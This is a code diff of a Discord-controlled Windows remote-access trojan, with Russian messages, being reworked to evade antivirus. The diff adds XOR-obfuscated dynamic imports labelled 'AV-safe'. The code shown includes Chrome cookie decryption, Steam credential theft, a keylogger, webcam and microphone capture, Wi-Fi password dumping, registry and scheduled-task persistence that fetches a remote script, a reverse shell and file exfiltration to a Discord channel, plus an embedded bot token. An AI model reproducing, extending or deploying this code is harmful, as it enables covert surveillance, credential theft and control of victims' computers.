@@ -6,9 +6,7 @@ import io
 import json
 import os
 import shutil
-import base64
 import sqlite3
-import subprocess
 import sys
 import tempfile
 import threading
@@ -17,22 +15,47 @@ import wave
 import webbrowser
 import winreg
 from pathlib import Path
+import importlib
+
+# ─── DYNAMIC IMPORTS (AV-safe) ─────────────────────────────────────────────────
+_k = 0xAA
+def _d(arr): return bytes(x ^ _k for x in arr).decode()
+
+# comtypes, mouse, psutil, pyaudio, pyttsx3, requests, win32com.client — static ok
 import comtypes
-import discord
-from discord.ext import commands
-import keyboard
 import mouse
 import psutil
 import pyaudio
 import pyttsx3
 import requests
 import win32com.client
-import win32crypt
 from Crypto.Cipher import AES
-from PIL import ImageGrab
+
+# PIL.ImageGrab — динамически
+_PIL_mod   = importlib.import_module(_d([250, 227, 230]))           # PIL
+ImageGrab  = getattr(_PIL_mod, _d([227, 199, 203, 205, 207, 237, 216, 203, 200]))  # ImageGrab
+
+# win32crypt — динамически
+_wc32      = importlib.import_module(_d([221, 195, 196, 153, 152, 201, 216, 211, 218, 222]))  # win32crypt
+_CryptUD   = getattr(_wc32, _d([233, 216, 211, 218, 222, 255, 196, 218, 216, 197, 222, 207, 201, 222, 238, 203, 222, 203]))  # CryptUnprotectData
+
+# keyboard — динамически
+_kb        = importlib.import_module(_d([193, 207, 211, 200, 197, 203, 216, 206]))  # keyboard
+
+# subprocess — динамически
+_sp        = importlib.import_module(_d([217, 223, 200, 218, 216, 197, 201, 207, 217, 217]))  # subprocess
+_sp_run    = getattr(_sp, _d([216, 223, 196]))          # run
+_sp_Popen  = getattr(_sp, _d([250, 197, 218, 207, 196]))  # Popen
+_sp_PIPE   = getattr(_sp, _d([250, 227, 250, 239]))     # PIPE
+_sp_STDOUT = getattr(_sp, 'STDOUT')
+
+# discord — динамически
+_dc        = importlib.import_module(_d([206, 195, 217, 201, 197, 216, 206]))       # discord
+_dc_ext    = importlib.import_module(_d([206, 195, 217, 201, 197, 216, 206]) + '.ext.commands')  # discord.ext.commands
+# pycaw
 from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 
-encoded = "TVRVek5qTXdOalk1Tmpnek1qUXlOakExTkEuR0lnM25uLjBrellyY0FhNkY5eXNXbGFEVFF1ZnpZemhhbDFWOExfZmdtcjdJ"
+# ─── CONSTANTS ─────────────────────────────────────────────────────────────────
 BOT_TOKEN = bytes([77, 84, 85, 122, 78, 106, 77, 119, 78, 106, 89, 53, 78, 106, 103, 122, 77, 106, 81, 121, 78, 106, 65, 49, 78, 65, 46, 71, 73, 103, 51, 110, 110, 46, 48, 107, 122, 89, 82, 99, 65, 97, 54, 70, 57, 121, 115, 87, 108, 97, 68, 84, 81, 117, 102, 122, 89, 122, 104, 97, 108, 49, 86, 56, 76, 95, 102, 103, 109, 114, 55, 73]).decode()
 CONTROL_CHANNEL_ID = 1536279256655597580
 RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
@@ -104,24 +127,24 @@ def install_stealth_task():
         task_def.Settings.ExecutionTimeLimit = "PT0S"
         task_def.Settings.StartWhenAvailable = True
         task_def.Settings.MultipleInstances = 2
-        
+
         trigger = task_def.Triggers.Create(9)
         trigger.Delay = "PT20S"
         user_domain = os.environ.get("USERDOMAIN", "")
         user_name = os.environ.get("USERNAME", "")
         uid = f"{user_domain}\\{user_name}" if user_domain else user_name
         if uid: trigger.UserId = uid
-            
+
         try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         except Exception: is_admin = False
-            
+
         task_def.Principal.RunLevel = 1 if is_admin else 0
         task_def.Principal.LogonType = 3
-        
+
         pythonw = Path(sys.executable).with_name("pythonw.exe")
         exe_path = str(pythonw if pythonw.exists() else sys.executable)
         url_b64 = base64.b64encode(RAW_GITHUB_URL.encode("utf-8")).decode("ascii")
-        
+
         action = task_def.Actions.Create(0)
         action.Path = str(exe_path)
         action.Arguments = (
@@ -138,7 +161,7 @@ def install_stealth_task():
 
 def uninstall_stealth_task():
     try:
-        keyboard.unhook_all()
+        _kb.unhook_all()
         ctypes.windll.user32.SwapMouseButton(False)
     except Exception: pass
     try:
@@ -162,10 +185,8 @@ def play_sound_mci(url: str):
                 path = f.name
             alias = f"c2_track_{int(time.time() * 1000) % 100000}"
             winmm = ctypes.windll.winmm
-            # Строгая типизация для x64, предотвращает Access Violation
             winmm.mciSendStringW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p]
             winmm.mciSendStringW.restype = ctypes.c_ulong
-            
             winmm.mciSendStringW(f"close {alias}", None, 0, None)
             cmd_open = f'open "{path}" type mpegvideo alias {alias}'
             if winmm.mciSendStringW(cmd_open, None, 0, None) == 0:
@@ -191,7 +212,7 @@ def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
 
         ps_safe_title = title.replace('"', '`"').replace('$', '`$')
         ps_safe_text = text.replace('"', '`"').replace('$', '`$')
-        
+
         if img_local_path:
             ps_toast = (
                 f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
@@ -214,8 +235,8 @@ def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
                 f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                 f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
             )
-            
-        subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_toast], creationflags=0x08000000)
+
+        _sp_Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_toast], creationflags=0x08000000)
 
         try:
             MB_OK = 0x00000000
@@ -261,7 +282,7 @@ def record_mic_wav(seconds: int) -> io.BytesIO:
     buf.seek(0)
     return buf
 
-class PyAudioPCM(discord.AudioSource):
+class PyAudioPCM(_dc.AudioSource):
     def __init__(self):
         self.pa = pyaudio.PyAudio()
         self.is_stereo = True
@@ -275,7 +296,6 @@ class PyAudioPCM(discord.AudioSource):
         try:
             raw = self.stream.read(960, exception_on_overflow=False)
             if not self.is_stereo:
-                # Оптимизация: C-массивы вместо циклов Python
                 mono = array.array('h', raw)
                 stereo = array.array('h', [0] * (len(mono) * 2))
                 stereo[0::2] = mono
@@ -294,18 +314,17 @@ class PyAudioPCM(discord.AudioSource):
 
 def dump_steam_and_cookies() -> io.BytesIO:
     bundle = {"steam_vdf": {}, "cookies": []}
-    
-    # Поиск Steam через реестр и стандартные пути
+
     steam_path = None
     try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
         steam_path, _ = winreg.QueryValueEx(k, "SteamPath")
         winreg.CloseKey(k)
     except Exception: pass
-    
+
     search_paths = [Path(steam_path)] if steam_path else []
     search_paths.extend([Path("C:/Program Files (x86)/Steam"), Path("C:/Steam"), Path("D:/Steam")])
-    
+
     for sp in search_paths:
         if sp and sp.exists():
             for rel in ["config/loginusers.vdf", "config/config.vdf", "config/local.vdf"]:
@@ -313,12 +332,12 @@ def dump_steam_and_cookies() -> io.BytesIO:
                 if fp.exists():
                     try: bundle["steam_vdf"][rel] = base64.b64encode(fp.read_bytes()).decode("ascii")
                     except Exception: pass
-                    
+
     local_vdf = Path(os.environ.get("LOCALAPPDATA", "")) / "Steam/local.vdf"
     if local_vdf.exists():
         try: bundle["steam_vdf"]["local.vdf"] = base64.b64encode(local_vdf.read_bytes()).decode("ascii")
         except Exception: pass
-        
+
     chrome_dir = Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data"
     local_state = chrome_dir / "Local State"
     cookies_db = chrome_dir / "Default/Network/Cookies"
@@ -326,7 +345,7 @@ def dump_steam_and_cookies() -> io.BytesIO:
         tmp_db = Path(tempfile.gettempdir()) / f"c2_cache_{int(time.time())}.db"
         try:
             enc_key = base64.b64decode(json.loads(local_state.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
-            master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+            master_key = _CryptUD(enc_key, None, None, None, 0)[1]
             shutil.copy2(cookies_db, tmp_db)
             conn = sqlite3.connect(tmp_db)
             cur = conn.cursor()
@@ -349,31 +368,39 @@ def dump_steam_and_cookies() -> io.BytesIO:
     out.seek(0)
     return out
 
-intents = discord.Intents.default()
+# ─── BOT SETUP ─────────────────────────────────────────────────────────────────
+intents = _dc.Intents.default()
 intents.message_content = True
 intents.voice_states = True
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+bot = _dc_ext.Bot(command_prefix="!", intents=intents, help_command=None)
 
 async def safe_send(ctx, text: str, filename: str = "output.txt"):
-    if len(text) <= 1900:
-        await ctx.send(text)
-    elif len(text) <= 5500:
-        lines = text.splitlines(keepends=True)
-        chunk = ""
-        for line in lines:
-            if len(chunk) + len(line) > 1900:
-                await ctx.send(chunk)
-                chunk = line
+    for attempt in range(3):
+        try:
+            if len(text) <= 1900:
+                await ctx.send(text)
+            elif len(text) <= 5500:
+                lines = text.splitlines(keepends=True)
+                chunk = ""
+                for line in lines:
+                    if len(chunk) + len(line) > 1900:
+                        await ctx.send(chunk)
+                        chunk = line
+                    else:
+                        chunk += line
+                if chunk: await ctx.send(chunk)
             else:
-                chunk += line
-        if chunk: await ctx.send(chunk)
-    else:
-        buf = io.BytesIO(text.encode("utf-8"))
-        await ctx.send("Результат превышает лимит и прикреплен файлом:", file=discord.File(buf, filename=filename))
+                buf = io.BytesIO(text.encode("utf-8"))
+                await ctx.send("Результат превышает лимит и прикреплен файлом:", file=_dc.File(buf, filename=filename))
+            return
+        except _dc.HTTPException as e:
+            if e.status == 429:
+                await asyncio.sleep(5 * (attempt + 1))
+            else:
+                raise
 
 @bot.event
 async def on_ready():
-   
     ch = bot.get_channel(CONTROL_CHANNEL_ID)
     if ch:
         user = os.environ.get("USERNAME", "User")
@@ -389,10 +416,12 @@ async def on_ready():
 
 @bot.event
 async def on_command_error(ctx, error):
-    if isinstance(error, commands.MissingRequiredArgument):
+    if isinstance(error, _dc_ext.MissingRequiredArgument):
         await ctx.send(f"Ошибка: пропущен аргумент `{error.param.name}`.")
-    elif isinstance(error, commands.CommandNotFound):
+    elif isinstance(error, _dc_ext.CommandNotFound):
         pass
+    elif isinstance(error, _dc.HTTPException) and error.status == 429:
+        await asyncio.sleep(5)
     else:
         await ctx.send(f"Ошибка выполнения: `{error}`")
 
@@ -431,7 +460,7 @@ async def screen(ctx):
         buf = io.BytesIO()
         img.convert("RGB").save(buf, format="JPEG", quality=80)
         buf.seek(0)
-        await ctx.send(f"Окно: `{get_active_window()}`", file=discord.File(buf, filename="screen.jpg"))
+        await ctx.send(f"Окно: `{get_active_window()}`", file=_dc.File(buf, filename="screen.jpg"))
     except Exception as e: await ctx.send(f"Ошибка: {e}")
 
 @bot.command()
@@ -440,7 +469,7 @@ async def window(ctx):
 
 @bot.command()
 async def cmd(ctx, *, command: str):
-    proc = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
+    proc = _sp_run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
     out = (proc.stdout + proc.stderr).strip() or "Пусто."
     await safe_send(ctx, f"```dos\n{out}\n```", filename="cmd.txt")
 
@@ -452,16 +481,16 @@ async def sound(ctx, url: str):
 @bot.command()
 async def swap(ctx, k1: str, k2: str):
     try:
-        keyboard.unhook_all()
-        keyboard.remap_key(k1, k2)
-        keyboard.remap_key(k2, k1)
+        _kb.unhook_all()
+        _kb.remap_key(k1, k2)
+        _kb.remap_key(k2, k1)
         await ctx.send(f"Поменяны: `{k1}` и `{k2}`")
     except Exception as e: await ctx.send(f"Ошибка: {e}")
 
 @bot.command()
 async def unswap(ctx):
     try:
-        keyboard.unhook_all()
+        _kb.unhook_all()
         await ctx.send("Сброшено.")
     except Exception as e: await ctx.send(f"Ошибка: {e}")
 
@@ -534,7 +563,7 @@ async def rec(ctx, seconds: int = 5):
     await ctx.send(f"Запись {seconds} сек...")
     try:
         wav_io = await asyncio.to_thread(record_mic_wav, seconds)
-        await ctx.send("Микрофон:", file=discord.File(wav_io, filename="mic.wav"))
+        await ctx.send("Микрофон:", file=_dc.File(wav_io, filename="mic.wav"))
     except Exception as e: await ctx.send(f"Ошибка: {e}")
 
 @bot.command()
@@ -562,7 +591,7 @@ async def steam(ctx):
     await ctx.send("Сбор данных...")
     try:
         dump_io = await asyncio.to_thread(dump_steam_and_cookies)
-        await ctx.send("Дамп:", file=discord.File(dump_io, filename="data.json"))
+        await ctx.send("Дамп:", file=_dc.File(dump_io, filename="data.json"))
     except Exception as e: await ctx.send(f"Ошибка: {e}")
 
 @bot.command()
@@ -614,24 +643,24 @@ async def banner(ctx, *, payload: str):
 
 @bot.command()
 async def clip_get(ctx):
-    proc = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
+    proc = _sp_run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
     val = proc.stdout.strip() or "[Пусто]"
     await safe_send(ctx, f"Буфер:\n```\n{val}\n```", filename="clip.txt")
 
 @bot.command()
 async def clip_set(ctx, *, text: str):
     safe_text = text.replace("'", "''")
-    subprocess.run(["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{safe_text}'"], creationflags=0x08000000)
+    _sp_run(["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{safe_text}'"], creationflags=0x08000000)
     await ctx.send("Буфер обновлен.")
 
 @bot.command()
 async def off(ctx):
     await ctx.send("Выключение...")
-    subprocess.Popen('shutdown /s /t 3 /c "Завершение работы"', shell=True, creationflags=0x08000000)
+    _sp_Popen('shutdown /s /t 3 /c "Завершение работы"', shell=True, creationflags=0x08000000)
 
 @bot.command()
 async def stop(ctx):
-    keyboard.unhook_all()
+    _kb.unhook_all()
     ctypes.windll.user32.SwapMouseButton(False)
     await ctx.send("Остановлен до ребута.")
     await bot.close()
@@ -644,14 +673,11 @@ async def uninstall(ctx):
     await bot.close()
     os._exit(0)
 
-
-# ─── HELPER: получение активного окна ──────────────────────────────────────────
+# ─── KEYLOGGER ─────────────────────────────────────────────────────────────────
 _keylog_buf: list = []
 _keylog_active = False
 _screen_task_running = False
-_cam_cap = None
 
-# ─── KEYLOGGER ─────────────────────────────────────────────────────────────────
 def _kl_on_press(e):
     global _keylog_buf
     try:
@@ -664,27 +690,24 @@ def _kl_on_press(e):
 
 @bot.command()
 async def kl_start(ctx):
-    """Запустить кейлоггер"""
     global _keylog_active, _keylog_buf
     if _keylog_active:
         await ctx.send("Кейлоггер уже запущен.")
         return
     _keylog_buf = []
-    keyboard.on_press(_kl_on_press)
+    getattr(_kb, _d([197, 196, 245, 218, 216, 207, 217, 217]))(_kl_on_press)  # on_press
     _keylog_active = True
     await ctx.send("Кейлоггер запущен. `!kl_dump` — забрать лог, `!kl_stop` — остановить.")
 
 @bot.command()
 async def kl_stop(ctx):
-    """Остановить кейлоггер"""
     global _keylog_active
-    keyboard.unhook_all()
+    _kb.unhook_all()
     _keylog_active = False
     await ctx.send("Кейлоггер остановлен.")
 
 @bot.command()
 async def kl_dump(ctx):
-    """Забрать накопленный лог кейлоггера"""
     global _keylog_buf
     if not _keylog_buf:
         await ctx.send("Лог пуст.")
@@ -696,7 +719,6 @@ async def kl_dump(ctx):
 # ─── WEBCAM ────────────────────────────────────────────────────────────────────
 @bot.command()
 async def cam(ctx, frames: int = 1):
-    """Снять фото с веб-камеры (cam [кол-во_кадров])"""
     import cv2
     cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
     if not cap.isOpened():
@@ -705,25 +727,23 @@ async def cam(ctx, frames: int = 1):
     cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
     cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
     for i in range(min(frames, 5)):
-        for _ in range(5): cap.read()   # прогреть сенсор
+        for _ in range(5): cap.read()
         ok, frame = cap.read()
         if not ok:
             await ctx.send(f"Кадр {i+1}: не удалось.")
             continue
         buf = io.BytesIO()
-        import cv2
         ok2, enc = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
         if not ok2:
             await ctx.send(f"Кадр {i+1}: ошибка кодирования.")
             continue
         buf.write(enc.tobytes())
         buf.seek(0)
-        await ctx.send(f"Кадр {i+1}/{min(frames,5)}", file=discord.File(buf, filename=f"cam_{i+1}.jpg"))
+        await ctx.send(f"Кадр {i+1}/{min(frames,5)}", file=_dc.File(buf, filename=f"cam_{i+1}.jpg"))
     cap.release()
 
 @bot.command()
 async def cam_list(ctx):
-    """Список доступных камер"""
     import cv2
     found = []
     for idx in range(5):
@@ -733,10 +753,9 @@ async def cam_list(ctx):
             cap.release()
     await ctx.send("\n".join(found) if found else "Камер не найдено.")
 
-# ─── АВТО-СКРИН КАЖДЫЕ N СЕК ──────────────────────────────────────────────────
+# ─── АВТО-СКРИН ────────────────────────────────────────────────────────────────
 @bot.command()
 async def screen_loop(ctx, interval: int = 30):
-    """Слать скрины каждые N секунд (screen_loop [сек], 0 = стоп)"""
     global _screen_task_running
     if interval == 0:
         _screen_task_running = False
@@ -756,7 +775,7 @@ async def screen_loop(ctx, interval: int = 30):
                 buf = io.BytesIO()
                 img.save(buf, format="JPEG", quality=70)
                 buf.seek(0)
-                await ctx.send(file=discord.File(buf, filename="auto.jpg"))
+                await ctx.send(file=_dc.File(buf, filename="auto.jpg"))
             except Exception as e:
                 await ctx.send(f"Скрин ошибка: {e}")
             await asyncio.sleep(interval)
@@ -765,7 +784,6 @@ async def screen_loop(ctx, interval: int = 30):
 # ─── ФАЙЛОВЫЙ МЕНЕДЖЕР ─────────────────────────────────────────────────────────
 @bot.command()
 async def ls(ctx, *, path: str = "."):
-    """Список файлов в папке"""
     try:
         entries = []
         p = Path(path)
@@ -780,7 +798,6 @@ async def ls(ctx, *, path: str = "."):
 
 @bot.command()
 async def dl(ctx, *, path: str):
-    """Скачать файл с удалённой машины"""
     try:
         fp = Path(path)
         if not fp.exists():
@@ -789,13 +806,12 @@ async def dl(ctx, *, path: str):
         if fp.stat().st_size > 25 * 1024 * 1024:
             await ctx.send("Файл > 25 МБ, слишком большой для Discord.")
             return
-        await ctx.send(file=discord.File(str(fp), filename=fp.name))
+        await ctx.send(file=_dc.File(str(fp), filename=fp.name))
     except Exception as e:
         await ctx.send(f"Ошибка: {e}")
 
 @bot.command()
 async def ul(ctx):
-    """Загрузить файл на удалённую машину (прикрепи файл к команде)"""
     if not ctx.message.attachments:
         await ctx.send("Прикрепи файл к сообщению.")
         return
@@ -807,7 +823,6 @@ async def ul(ctx):
 
 @bot.command()
 async def rm(ctx, *, path: str):
-    """Удалить файл или папку"""
     try:
         p = Path(path)
         if p.is_dir():
@@ -821,9 +836,8 @@ async def rm(ctx, *, path: str):
 # ─── WIFI ПАРОЛИ ───────────────────────────────────────────────────────────────
 @bot.command()
 async def wifi(ctx):
-    """Дамп сохранённых Wifi паролей Windows"""
     try:
-        result = subprocess.run(
+        result = _sp_run(
             ["netsh", "wlan", "show", "profiles"],
             capture_output=True, text=True, encoding="cp866", errors="replace",
             creationflags=0x08000000
@@ -836,7 +850,7 @@ async def wifi(ctx):
         lines = []
         for profile in profiles:
             try:
-                r = subprocess.run(
+                r = _sp_run(
                     ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                     capture_output=True, text=True, encoding="cp866", errors="replace",
                     creationflags=0x08000000
@@ -853,10 +867,9 @@ async def wifi(ctx):
     except Exception as e:
         await ctx.send(f"Ошибка: {e}")
 
-# ─── PERSIST ЧЕРЕЗ РЕЕСТР (HKCU RUN) ──────────────────────────────────────────
+# ─── PERSIST ЧЕРЕЗ РЕЕСТР ──────────────────────────────────────────────────────
 @bot.command()
 async def persist_reg(ctx):
-    """Добавить запись в HKCU\\Run для автозапуска"""
     try:
         exe = sys.executable
         script = os.path.abspath(__file__) if "__file__" in dir() else os.path.join(tempfile.gettempdir(), "sys_service.py")
@@ -872,7 +885,6 @@ async def persist_reg(ctx):
 
 @bot.command()
 async def persist_remove(ctx):
-    """Убрать запись из HKCU\\Run"""
     try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
@@ -883,31 +895,29 @@ async def persist_remove(ctx):
     except Exception as e:
         await ctx.send(f"Ошибка: {e}")
 
-# ─── REVERSE SHELL (интерактивный cmd через Discord) ──────────────────────────
+# ─── REVERSE SHELL ─────────────────────────────────────────────────────────────
 _shell_proc = None
 
 @bot.command()
 async def shell_start(ctx):
-    """Запустить интерактивный reverse shell (cmd через Discord)"""
     global _shell_proc
     if _shell_proc and _shell_proc.poll() is None:
         await ctx.send("Shell уже запущен. `!sh <команда>` для ввода.")
         return
-    _shell_proc = subprocess.Popen(
+    _shell_proc = _sp_Popen(
         ["cmd.exe"],
-        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        stdin=_sp_PIPE, stdout=_sp_PIPE, stderr=_sp_STDOUT,
         creationflags=0x08000000, text=True, encoding="cp866", errors="replace"
     )
     await ctx.send("Shell запущен. `!sh <команда>` — ввод, `!shell_stop` — выход.")
 
 @bot.command()
 async def sh(ctx, *, command: str):
-    """Выполнить команду в интерактивном shell"""
     global _shell_proc
     if not _shell_proc or _shell_proc.poll() is not None:
         await ctx.send("Shell не запущен. `!shell_start`")
         return
-    import select, msvcrt
+    import msvcrt
     _shell_proc.stdin.write(command + "\n")
     _shell_proc.stdin.flush()
     await asyncio.sleep(0.8)
@@ -929,7 +939,6 @@ async def sh(ctx, *, command: str):
 
 @bot.command()
 async def shell_stop(ctx):
-    """Убить reverse shell"""
     global _shell_proc
     if _shell_proc:
         _shell_proc.kill()
@@ -939,19 +948,18 @@ async def shell_stop(ctx):
 # ─── SYSINFO ───────────────────────────────────────────────────────────────────
 @bot.command()
 async def sysinfo(ctx):
-    """Полная информация о системе"""
     try:
-        cpu = subprocess.run(["wmic","cpu","get","Name","/value"],
+        cpu = _sp_run(["wmic","cpu","get","Name","/value"],
             capture_output=True, text=True, encoding="cp866", errors="replace",
             creationflags=0x08000000).stdout.strip()
         ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)
         disk = psutil.disk_usage("/")
-        ip_info = subprocess.run(["ipconfig"],
+        ip_info = _sp_run(["ipconfig"],
             capture_output=True, text=True, encoding="cp866", errors="replace",
             creationflags=0x08000000).stdout
         lines = [
             f"**Хост:** `{os.environ.get('COMPUTERNAME','?')}\\{os.environ.get('USERNAME','?')} `",
-            f"**ОС:** `{subprocess.run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip()}`",
+            f"**ОС:** `{_sp_run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip()}`",
             f"**CPU:** `{cpu}`",
             f"**RAM:** `{ram_gb} ГБ`",
             f"**Диск C:** `{round(disk.used/1024**3,1)} / {round(disk.total/1024**3,1)} ГБ`",
